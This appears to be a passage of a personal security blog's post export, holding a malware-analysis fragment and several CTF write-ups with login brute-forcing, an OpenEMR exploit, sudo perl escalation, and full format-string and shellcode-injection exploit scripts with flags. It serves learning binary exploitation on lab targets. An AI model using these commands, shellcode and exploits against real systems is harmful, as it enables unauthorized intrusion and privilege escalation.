\u003ctr\u003e\n          \u003ctd\u003e\u003cstrong\u003eFile Type\u003c/strong\u003e\u003c/td\u003e\n          \u003ctd\u003eMicrosoft Office Word(15.0000)\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003cstrong\u003eMD5\u003c/strong\u003e\u003c/td\u003e\n          \u003ctd\u003eafbe00e755a2cf963f0eedbb4e310198\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003cstrong\u003eSHA1\u003c/strong\u003e\u003c/td\u003e\n          \u003ctd\u003ea55bd3f15ce743c9cda7bec05afe50b9aefa4683\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003cstrong\u003eSHA256\u003c/strong\u003e\u003c/td\u003e\n          \u003ctd\u003eab541df861c6045a17006969dac074a7d300c0a8edd0a5815c8b871b62ecdda7\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003cstrong\u003eCreated Time\u003c/strong\u003e\u003c/td\u003e\n          \u003ctd\u003e15/5/2024 11:47:03 PM\u003c/td\u003e\n      \u003c/tr\u003e\n  \u003c/tbody\u003e\n\u003c/table\u003e\n\u003ctable\u003e\n  \u003cthead\u003e\n      \u003ctr\u003e\n          \u003cth\u003e\u003cstrong\u003eFile Name\u003c/strong\u003e\u003c/th\u003e\n          \u003cth\u003eRemoteLoad.dotm\u003c/th\u003e\n      \u003c/tr\u003e\n  \u003c/thead\u003e\n  \u003ctbody\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003cstrong\u003eFile Size\u003c/strong\u003e\u003c/td\u003e\n          \u003ctd\u003e23.76 KiB\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003cstrong\u003eFile Type\u003c/strong\u003e\u003c/td\u003e\n          \u003ctd\u003eMicrosoft Office Word(15.0000)\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003cstrong\u003eMD5\u003c/strong\u003e\u003c/td\u003e\n          \u003ctd\u003e8114e5e15d4086843cf33e3fca7c945b\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003cstrong\u003eSHA1\u003c/strong\u003e\u003c/td\u003e\n          \u003ctd\u003e5f7f0b1419448c5fe1a8051ac8cb2cf7b95a3ffa\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003cstrong\u003eSHA256\u003c/strong\u003e\u003c/td\u003e\n          \u003ctd\u003e145daf50aefb7beec32556fd011e10c9eaa71e356649edfce4404409c1e8fa30\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003cstrong\u003eCreated Time\u003c/strong\u003e\u003c/td\u003e\n          \u003ctd\u003e15/5/2024 11:52:02 PM\u003c/td\u003e\n      \u003c/tr\u003e\n  \u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch2 id=\"3-case-specific-requirements\"\u003e3. Case Specific Requirements\u003c/h2\u003e\n\u003ch3 id=\"machine\"\u003eMachine\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eWindows Environment\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"tools\"\u003eTools\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003ehashmyfiles\u003c/li\u003e\n\u003cli\u003eolevba\u003c/li\u003e\n\u003cli\u003eMicrosoft Word\u003c/li\u003e\n\u003cli\u003eCyberChef\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"4-static-analysis\"\u003e4. Static Analysis\u003c/h2\u003e\n\u003ch3 id=\"41-bubarparlimendocx\"\u003e4.1 bubarparlimen.docx\u003c/h3\u003e\n\u003cp\u003ebubarparlimen.docx is a \u003ccode\u003e.docx\u003c/code\u003e. To go further into the analysis, it is necessary to understand what \u003ccode\u003e.docx\u003c/code\u003e structure is.\u003c/p\u003e","title":"Bubar Parlimen [Malware Analysis]"},{"content":"Morpheus is a THM box created for MCC 2023 registration. I am not a MCC 2023 candidate but this is my take on this box :3\nInitial Recon Nmap nmap -sC -sV 10.10.13.181 -oA nmap/initial Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-11 05:56 EST Nmap scan report for 10.10.13.181 Host is up (0.24s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.18.22.45 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 4 | vsFTPd 3.0.3 - secure, fast, stable |_End of status | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_-rw-r--r-- 1 65534 65534 1075835 May 27 2023 CONFIDENTIAL.pdf 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 c9:c9:90:01:44:d3:be:ce:8f:ed:9d:f5:79:fe:1d:01 (RSA) | 256 67:43:55:86:5a:6b:db:80:13:68:d1:ee:0f:76:8d:47 (ECDSA) |_ 256 8c:e1:85:36:1d:ba:77:05:95:36:4e:c3:3b:33:aa:5c (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-title: Apache2 Ubuntu Default Page: It works |_http-server-header: Apache/2.4.29 (Ubuntu) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 48.88 seconds Based on our port scanning result, there is a web server. Time to look into it\nDirectory enumeration gobuster dir -u http://10.10.13.181/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.13.181/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /management (Status: 301) [Size: 317] [--\u0026gt; http://10.10.13.181/management/] /backup (Status: 301) [Size: 313] [--\u0026gt; http://10.10.13.181/backup/] found /management and /backup\nmanagement directory backup directory Key takeaway got the usernames and passwords list bruteforce the login page at /management Bruteforcing Login page Using WFUZZ we can see what input will create different response\nInitial bruteforce command wfuzz -c -z file,username.txt -z file,password.txt -d \u0026#34;new_login_session_management=1\u0026amp;authProvider=Default\u0026amp;authUser=FUZZ\u0026amp;clearPass=FUZ2Z\u0026amp;languageChoice=1\u0026#34; \u0026#34;http://10.10.13.181/management/interface/main/main_screen.php?auth=login\u0026amp;site=default\u0026#34; now we can exclude the length = 12 using --hl 12\nFinal Bruteforce command wfuzz -c -z file,username.txt -z file,password.txt --hl 12 -d \u0026#34;new_login_session_management=1\u0026amp;authProvider=Default\u0026amp;authUser=FUZZ\u0026amp;clearPass=FUZ2Z\u0026amp;languageChoice=1\u0026#34; \u0026#34;http://10.10.13.181/management/interface/main/main_screen.php?auth=login\u0026amp;site=default\u0026#34; morpheus:gooniegoogoo\nGaining foothold By using the credetials we get to log into the OpenEMR system, then we can find the version of the system\nBy searching the version of this OpenEMR, we can find the CVE including exploit for it\nhttps://github.com/EmreOvunc/OpenEMR_Vulnerabilities Using the exploit from the link above, we can get a shell\nwe can get the User Flag\nmcc2023{dd6900-2f1248-6c5e20-48331d-05280d-8deab1-cde577-1e2f16-339fcd-36a90c}\nPrivilege Escalation theres no need for us to enter the password to use perl as root. looking at gtfo bins we can find the command to exploit this.\nsudo perl -e \u0026#39;exec \u0026#34;/bin/sh\u0026#34;;\u0026#39; we can alter the command to give the flag\nsudo perl -e \u0026#39;exec \u0026#34;cat /root/root.txt\u0026#34;;\u0026#39; root flag\nmcc2023{a0baeb2849_6fd7ad460c_209045e194_08b3b6d5e8_1b6a800746_7e3702b95b}\n","permalink":"http://localhost:1313/posts/thm-mcc23/","summary":"\u003cp\u003eMorpheus is a THM box created for MCC 2023 registration. I am not a MCC 2023 candidate but this is my take on this box :3\u003c/p\u003e\n\u003ch1 id=\"initial-recon\"\u003eInitial Recon\u003c/h1\u003e\n\u003ch2 id=\"nmap\"\u003eNmap\u003c/h2\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003enmap -sC -sV 10.10.13.181 -oA nmap/initial\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-11 05:56 EST\nNmap scan report for 10.10.13.181\nHost is up (0.24s latency).\nNot shown: 997 closed tcp ports (conn-refused)\nPORT   STATE SERVICE VERSION\n21/tcp open  ftp     vsftpd 3.0.3\n| ftp-syst: \n|   STAT: \n| FTP server status:\n|      Connected to ::ffff:10.18.22.45\n|      Logged in as ftp\n|      TYPE: ASCII\n|      No session bandwidth limit\n|      Session timeout in seconds is 300\n|      Control connection is plain text\n|      Data connections will be plain text\n|      At session startup, client count was 4\n|      vsFTPd 3.0.3 - secure, fast, stable\n|_End of status\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n|_-rw-r--r--    1 65534    65534     1075835 May 27  2023 CONFIDENTIAL.pdf\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 c9:c9:90:01:44:d3:be:ce:8f:ed:9d:f5:79:fe:1d:01 (RSA)\n|   256 67:43:55:86:5a:6b:db:80:13:68:d1:ee:0f:76:8d:47 (ECDSA)\n|_  256 8c:e1:85:36:1d:ba:77:05:95:36:4e:c3:3b:33:aa:5c (ED25519)\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n|_http-title: Apache2 Ubuntu Default Page: It works\n|_http-server-header: Apache/2.4.29 (Ubuntu)\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 48.88 seconds\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eBased on our port scanning result, there is a web server. Time to look into it\u003c/p\u003e","title":"Morpheus MCC23 [B2R]"},{"content":"This is an easy level challenge introducing Format String Vulnerability. The method used to solve this challenge is leaking any function address and find the base address for the system. With the known base address, we can overwrite a global variable into wanted value.\nInitial Analysis File Analysis Checking File type file fsb_overwrite fsb_overwrite: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=ecbb8000934a34b30ea8deb3a7675e08f8a44cda, for GNU/Linux 3.2.0, not stripped File type analysis\nThe file has an x86-64 architecture It is a dynamically-linked binary (uses libc functions) It is not stripped, means we can see the variable and function names Checking file security $ checksec --file fsb_overwrite [*] \u0026#39;/home/gnapac/Desktop/CTF/dreamHack/format_string_bug/fsb_overwrite\u0026#39; Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled File Security analysis\nIt has NX and PIE protection, but no stack canary. Code Analysis Full Code // Name: fsb_overwrite.c // Compile: gcc -o fsb_overwrite fsb_overwrite.c #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; void get_string(char *buf, size_t size) { ssize_t i = read(0, buf, size); if (i == -1) { perror(\u0026#34;read\u0026#34;); exit(1); } if (i \u0026lt; size) { if (i \u0026gt; 0 \u0026amp;\u0026amp; buf[i - 1] == \u0026#39;\\n\u0026#39;) i--; buf[i] = 0; } } int changeme; int main() { char buf[0x20]; setbuf(stdout, NULL); while (1) { get_string(buf, 0x20); printf(buf); puts(\u0026#34;\u0026#34;); if (changeme == 1337) { system(\u0026#34;/bin/sh\u0026#34;); } } } Program Process The program has a get_string() function where it receives variable to store size to read The program ask for an input with length of 0x20 Print out the input given Checking if the Attack Methodology This is the part of the code that causes format string vulnerability. This is the section to leak any function address and overwrite global variable changeme into value 1337.\nCrafting payload process\nLeak any function address Get the base address of the program. Leaked address - leaked function offset Get the address of changeme Get the i-th argument on stack that reads the input Write 1337 into changeme Leaking main address To leak the main address, load the program in gdb and begin analysis. First, set a breakpoint at start of main and during the comparison of changeme and 1337 Next of we run the program, and check the stack for addresses that we can get. Here we can see that main address is located near the stack. To leak the stack, create a fuzzer and try to locate the i-th argument on the stack to leak it . But before that, we need to know the offset of the function main in the program, this is for the ease of process in eyeballing the main address\nNow we can use a fuzzer to leak the main address. The fuzzer below will\niterate 99 times, testing format string payloads from 1 to 99.\np.sendline('%{}$p'.format(i).encode()) : This sends a format string payload to the binary. The payload %{}$p will attempt to read the i-th argument on the stack as a pointer and print it in hexadecimal format.\nresult = p.recvline(): This receives a line of output from the binary.\nfuzzer.py from pwn import * import os # This will automatically get context arch, bits, os etc elf = context.binary = ELF(\u0026#39;./fsb_overwrite\u0026#39;, checksec=False) # Let\u0026#39;s fuzz 100 values for i in range(1,100): try: p = process(level=\u0026#39;error\u0026#39;) p.sendline(\u0026#39;%{}$p\u0026#39;.format(i).encode()) result = p.recvline() print(str(i) + \u0026#39;: \u0026#39; + str(result)) p.close() except ValueError: pass Output:\nFrom the output, the number 15 successfully leaked the main address output. Next we need the offset for changeme variable to calculate it exact address.\nLastly, time to know which argument on the stack that reads our input. This also can be seen in the fuzzer output. The hex for symbol % $ p is 25, 24 and 70 respectively. We can see these hex at 6-th argument.\nAll information needed is there, now time to craft the payload.\nSend an input %15$p to leak main address io.sendline(\u0026#39;%15$p\u0026#39;) Receive the input main_address = int(io.recvline(),16) Calculate the base address main_offset = elf.sym[\u0026#39;main\u0026#39;] base_addr = main_address - main_offset Calculate the address of changeme change_me = base_addr + 0x401c #offset of changeme variable Using pwntools built in function fmtstr_payload as our final payload. (Note: 6 is the i-th argument that reads the input) payload = fmtstr_payload(6, {change_me : 1337}) Payload Execution Local\nRemote\nDH{b283dec57b17112a4e9aa6d5499c0f28}\nFull Script from pwn import * # Allows you to switch between local/GDB/remote from terminal def start(argv=[], *a, **kw): if args.GDB: # Set GDBscript below return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw) elif args.REMOTE: # (\u0026#39;server\u0026#39;, \u0026#39;port\u0026#39;) return remote(sys.argv[1], sys.argv[2], *a, **kw) else: # Run locally return process([exe] + argv, *a, **kw) # Specify your GDB script here for debugging gdbscript = \u0026#39;\u0026#39;\u0026#39; init-pwndbg b vuln \u0026#39;\u0026#39;\u0026#39;.format(**locals()) # Set up pwntools for the correct architecture exe = \u0026#39;./fsb_overwrite\u0026#39; # This will automatically get context arch, bits, os etc elf = context.binary = ELF(exe, checksec=False) # Change logging level to help with debugging (error/warning/info/debug) context.log_level = \u0026#39;debug\u0026#39; # =========================================================== # EXPLOIT GOES HERE # =========================================================== io = start() offsets = 35 main_offset = elf.sym[\u0026#39;main\u0026#39;] io.sendline(\u0026#39;%15$p\u0026#39;) main_address = int(io.recvline(),16) log.info(hex(main_address)) log.info(hex(main_offset)) base_addr = main_address - main_offset change_me = base_addr + 0x401c log.info(hex(change_me)) payload = fmtstr_payload(6, {change_me : 1337}) io.sendline(payload) # print(len(payload)) io.interactive() ","permalink":"http://localhost:1313/posts/dh-format-string/","summary":"\u003cp\u003eThis is an easy level challenge introducing Format String Vulnerability. The method used to solve this challenge is leaking any function address and find the base address for the system. With the known base address, we can overwrite a global variable into wanted value.\u003c/p\u003e\n\u003ch1 id=\"initial-analysis\"\u003eInitial Analysis\u003c/h1\u003e\n\u003ch2 id=\"file-analysis\"\u003eFile Analysis\u003c/h2\u003e\n\u003ch3 id=\"checking-file-type\"\u003eChecking File type\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003efile fsb_overwrite\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003efsb_overwrite: ELF 64-bit LSB pie executable, x86-64, version \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eSYSV\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003esha1\u003cspan style=\"color:#f92672\"\u003e]=\u003c/span\u003eecbb8000934a34b30ea8deb3a7675e08f8a44cda, \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e GNU/Linux 3.2.0, not stripped\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eFile type analysis\u003c/p\u003e","title":"DreamHack Wargames Format String [PWN]"},{"content":"This is the first challenge released during I-Hack 2024 Qualifier and I am so excited seeing the announcement of the challenge release. My adrenaline suddenly spike like crazy and more crazier I managed to get First Blood for this challenge\nOverview This challenge involves understanding of basic ROP and Shellcode Injection for ELF x86. The binary has no protection and the address of the input buffer were given. I would say a great challenge for beginners in PWN / Binary Exploitation\nThe challenge gave us a zip file, extracting the file will give us these contents\n├── Docker-Participant-MorseCodeEncoder │ ├── bin │ │ ├── banner │ │ ├── flag │ │ └── morse-converter │ └── Dockerfile Our target binary would be morse-encoder. flag and banner are just text files required for this program be tested locally.\nInitial Analysis File Analysis First to start this challenge, we must know what we are dealing with\nChecking File Type and Security Mitigations file morse-converter morse-converter: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=662eda4120f357bc5feda2fbe4335ba7e8cad799, for GNU/Linux 3.2.0, not stripped Next we check security mitigations using command ‘checksec’\nchecksec --file morse-converter Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX unknown - GNU_STACK missing PIE: No PIE (0x8048000) Stack: Executable RWX: Has RWX segments Key Findings :-\nThe ELF is 32-bit/x86 The ELF is not stripped, most object symbols are not removed means our reversing/debugging process will be much easier No Security Protection enabled including the Stack is Executable (Shellcode Injection) After seeing the security mitigations, we can see that this is a Shellcode Injection challenge.\nAnalysis in Ghidra Load the binary in ghidra, we can go straight to the main function to analyse the binary process.\nIn the main function, we can see straight away that the Stack Address was given, and Buffer Overflow occurred when we submitted input. And the challenge creator is kind enough to give us the address of input buffer.\nDuring the competition, my first idea was putting the shellcode in the buffer.\nShellcode + Padding + Overwrite Return address with Stack Address\nBut this doesnt work during the competition. (After the competition I saw group Pleiades and M53_A1ph4_Sh4rk! managed to solve it with shellcode inside the buffer)\nAnalysing textToMorse() function, i thought our shellcode will be converted into MorseCode due to textToMorse function implementation.\nAnyways, with that thoughts I decided to create the payload after the input buffer.\nPayload = Padding + (StackAddress+offset) + Shellcode\nExploitation Phase Extracting the Leaked Stack Address The program will give us the input\u0026rsquo;s variable address, so we need to leak it. Using, this can be achieve with this code snippet\nio.recvuntil(b\u0026#39;address: \u0026#39;) This line tells the script to read data from the remote service until it encounters the string 'address: '\nstack_address = int(io.recv(10),16) This line reads the next 10 bytes from the connection, converts them from a hexadecimal string to an integer.\nFinding the offsets Next we want to overwrite the return address, to achieve this, pwntools has a function cyclic to generate a string that can help us finding the offset.\nIn this case, input buffer has size 1024, so we need to give input more than that to overwrite the return address. So we will use cyclic 1500\n$ cyclic 1500 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaakgaakhaakiaakjaakkaaklaakmaaknaakoaakpaakqaakraaksaaktaakuaakvaakwaakxaakyaakzaalbaalcaaldaaleaalfaalgaalhaaliaaljaalkaallaalmaalnaaloaalpaalqaalraalsaaltaaluaalvaalwaalxaalyaalzaambaamcaamdaameaamfaamgaamhaamiaamjaamkaamlaammaamnaamoaampaamqaamraamsaamtaamuaamvaamwaamxaamyaamzaanbaancaandaaneaanfaangaanhaaniaanjaankaanlaanmaannaanoaanpaanqaanraansaantaanuaanvaanwaanxaanyaanzaaobaaocaaodaaoeaaofaaogaaohaaoiaaojaaokaaolaaomaaonaaooaaopaaoqaaoraaosaaotaaouaaovaaowaaoxaaoyaao now load the binary in gdb (i use pwndbg plugin), and give the string as input.\nWe see that value 0x6b616163 overwritten the return address. Using cyclic -l \u0026lt;value\u0026gt; we can find the offsets.\ncyclic -l 0x6b616163 Finding cyclic pattern of 4 bytes: b\u0026#39;caak\u0026#39; (hex: 0x6361616b) Found at offset 1008 However, this seems wrong. Input has 1024 size but why do we get 1024?\nThis is a normal approach for me dealing with x64 ELF, but because this seems wrong, time to analyze this further. Time to read the disassembly in main\n0x08049578 \u0026lt;+149\u0026gt;:\tlea esp,[ebp-0x8] 0x0804957b \u0026lt;+152\u0026gt;:\tpop ecx 0x0804957c \u0026lt;+153\u0026gt;:\tpop ebx 0x0804957d \u0026lt;+154\u0026gt;:\tpop ebp 0x0804957e \u0026lt;+155\u0026gt;:\tlea esp,[ecx-0x4] 0x08049581 \u0026lt;+158\u0026gt;:\tret We see that on line main + 149. the value at ebp-0x8 will be put into esp. Then the top of esp will be put into ecx. then the value at ecx-0x4 will be the return address (our target).\naddress esp = address ebp-0x8 ecx = value at new esp the EIP will return to the address on top of ESP return address = value at [ebp - 0x8] So basically, we overwrite the value at ebp-0x8 with the address pointing to our shellcode. But what is the offset until ebp-0x8? To figure this out, we try to give normal input then inspect the stack.\nSet breakpoint at 0x08049578\ntele ebp-0x8 00:0000│-008 0xffffce20 ebp-0x8 = 0xffffce20\nthen we can check the leaked stack address given\nstack addres = 0xffffca20\nUsing basic math we can calculate offset\n0xffffce20 - 0xffffca20 1024 So we can now finally confirmed that offset until EIP/Return Address = 1024\nPutting it all together To create the shellcode i use msfvenom -p linux/x86/exec CMD=/bin/sh -f py\nNow the idea is to craft the payload with this structure\nBelow is the python script\nfrom pwn import * if args.REMOTE: io = remote(sys.argv[1],sys.argv[2]) else: io = process(\u0026#34;./morse-converter\u0026#34;, ) elf = context.binary = ELF(\u0026#34;./morse-converter\u0026#34;, checksec=False) context.log_level = \u0026#39;info\u0026#39; buf = b\u0026#34;\u0026#34; buf += b\u0026#34;\\x6a\\x0b\\x58\\x99\\x52\\x66\\x68\\x2d\\x63\\x89\\xe7\\x68\u0026#34; buf += b\u0026#34;\\x2f\\x73\\x68\\x00\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\u0026#34; buf += b\u0026#34;\\xe8\\x08\\x00\\x00\\x00\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\u0026#34; buf += b\u0026#34;\\x00\\x57\\x53\\x89\\xe1\\xcd\\x80\u0026#34; io.recvuntil(b\u0026#39;address: \u0026#39;) stack_address = int(io.recv(10),16) print(f\u0026#39;Address Input: {hex(stack_address)}\u0026#39;) payload = b\u0026#39;\\x00\u0026#39;*(1024) payload += p32(stack_address+1028) payload += buf io.sendline(payload) io.interactive() ihack24{cfe81ab9909a2ea87188bf489c8141559dc7739d}\n","permalink":"http://localhost:1313/posts/ihack-morse-encoder/","summary":"\u003cp\u003eThis is the first challenge released during I-Hack 2024 Qualifier and I am so excited seeing the announcement of the challenge release. My adrenaline suddenly spike like crazy and more crazier I managed to get First Blood for this challenge\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"First Blood\" loading=\"lazy\" src=\"/images/morseencoder-ihack24/firstblood.png\"\u003e\u003c/p\u003e\n\u003ch1 id=\"overview\"\u003eOverview\u003c/h1\u003e\n\u003cp\u003eThis challenge involves understanding of basic ROP and Shellcode Injection for ELF x86.  The binary has no protection and the address of the input buffer were given. I would say a great challenge for beginners in PWN / Binary Exploitation\u003c/p\u003e","title":"IHack24 Morse Encoder [PWN]"},{"content":"This challenge involves understanding on how Vector Variable were stored in memory for C++. The program able to overflow the Vector Pointer to change where it points to.\nInitial Analysis File Analysis To know more about the given executable, we can use file command.\nfile vector_overflow vector_overflow: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=4a0b824c662ee47b5cd3e73176c0092f1fcf714b, for GNU/Linux 3.2.0, not stripped Key Findings:-\n64-bit executable not stripped means the executable has not had its symbol table and relocation information removed. Executable Security Check To figure out what security mitigations enabled in this executable, we can use checksec command that comes with pwntools library\nArch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) Key Findings :-\nNo PIE, means the executable is not position-independent. Everytime it is loaded, it will be at the same address. Stack Canary found, this will make it harder to do buffer overflow NX enabled, the executable has the NX bit enabled. The NX bit marks certain areas of memory as non-executable, which helps prevent execution of malicious code injected into these areas (e.g., via buffer overflows). Code Analysis #include \u0026lt;cstdlib\u0026gt; #include \u0026lt;iostream\u0026gt; #include \u0026lt;string\u0026gt; #include \u0026lt;vector\u0026gt; char buf[16]; std::vector\u0026lt;char\u0026gt; v = {\u0026#39;X\u0026#39;, \u0026#39;X\u0026#39;, \u0026#39;X\u0026#39;, \u0026#39;X\u0026#39;, \u0026#39;X\u0026#39;}; void lose() { puts(\u0026#34;Bye!\u0026#34;); exit(1); } void win() { system(\u0026#34;/bin/sh\u0026#34;); exit(0); } int main() { char ductf[6] = \u0026#34;DUCTF\u0026#34;; char* d = ductf; std::cin \u0026gt;\u0026gt; buf; std::cout \u0026lt;\u0026lt; \u0026#34;Vector v: \u0026#34;; for (auto \u0026amp;c : v) { std::cout \u0026lt;\u0026lt; c \u0026lt;\u0026lt; \u0026#34; \u0026#34;; } std::cout \u0026lt;\u0026lt; std::endl; if(v.size() == 5) { for(auto \u0026amp;c : v) { if(c != *d++) { lose(); } } win(); } lose(); } Code Summary:\nwin() is the target function The program will ask input for buf[16]. No input size limit, buffer flow can happen here vector v were initialized with {'X', 'X', 'X', 'X', 'X'} and to reach win() it needs to be {'D', 'U', 'C', 'T', 'F'} Payload Crafting Examining memory structure Found that buffer overflow can occur when the program ask for buf input from user. First thing to try is, what can we overwrite? what is the structure of the variables?\nTo do this, a debugger such as gdb is needed.\nFirst use command disassemble main. this will disassemble the main function into assembly code.\n0x00000000004013c8 \u0026lt;+48\u0026gt;:\tlea rax,[rip+0x3e11] # 0x4051e0 \u0026lt;buf\u0026gt; 0x00000000004013cf \u0026lt;+55\u0026gt;:\tmov rsi,rax 0x00000000004013d2 \u0026lt;+58\u0026gt;:\tlea rax,[rip+0x3ce7] # 0x4050c0 \u0026lt;_ZSt3cin@GLIBCXX_3.4\u0026gt; 0x00000000004013d9 \u0026lt;+65\u0026gt;:\tmov rdi,rax 0x00000000004013dc \u0026lt;+68\u0026gt;:\tcall 0x4016a2 \u0026lt;_ZStrsIcSt11char_traitsIcEERSt13basic_istreamIT_T0_ES6_PS3_\u0026gt; In this section, pwndbg plugin helps us identify that [rip+0x3e11] is the address for buf which is 0x4051e0.\n0x00000000004013ff \u0026lt;+103\u0026gt;:\tlea rax,[rip+0x3dea] # 0x4051f0 \u0026lt;v\u0026gt; 0x0000000000401406 \u0026lt;+110\u0026gt;:\tmov QWORD PTR [rbp-0x20],rax 0x000000000040140a \u0026lt;+114\u0026gt;:\tmov rax,QWORD PTR [rbp-0x20] 0x000000000040140e \u0026lt;+118\u0026gt;:\tmov rdi,rax 0x0000000000401411 \u0026lt;+121\u0026gt;:\tcall 0x401706 \u0026lt;_ZNSt6vectorIcSaIcEE5beginEv\u0026gt; In this section also shows us where vector v were stored which is at 0x4051f0. From here, vector v is on top of buf thus buf can overwrite vector v. But what does it look like in memory for vector v? To examine this, use command x/20x 0x4051f0\n0x4051f0 \u0026lt;v\u0026gt;:\t0x004182b0\t0x00000000\t0x004182b5\t0x00000000 0x405200 \u0026lt;v+16\u0026gt;:\t0x004182b5\t0x00000000\t0x00000000\t0x00000000 From the code, std::vector\u0026lt;char\u0026gt; v = {'X', 'X', 'X', 'X', 'X'}; were initialized, but there are no 'X' when we examine v. By reading the documentation about std::vector in C++.\n`std::vector` is a 